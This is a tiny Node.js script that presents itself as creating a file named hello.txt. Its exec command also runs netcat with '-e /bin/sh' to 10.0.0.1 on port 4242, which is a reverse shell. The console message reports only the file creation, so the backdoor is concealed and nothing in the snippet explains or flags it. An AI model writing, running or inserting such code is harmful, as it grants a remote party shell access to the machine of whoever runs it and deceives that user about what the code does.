const { exec } = require('child_process');

exec('touch hello.txt && nc -e /bin/sh 10.0.0.1 4242', (error, stdout, stderr) => {
    if (error) {
        console.error(`exec error: ${error}`);
        return;
    }
    console.log('hello.txt created');
});


